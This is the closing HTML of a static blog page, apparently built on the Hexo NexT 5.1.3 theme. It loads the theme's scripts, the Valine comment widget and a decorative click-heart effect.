  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  









<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>



  





  

  

  

  
  

  

  

  

</body>
</html>

<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/love.js"></script>
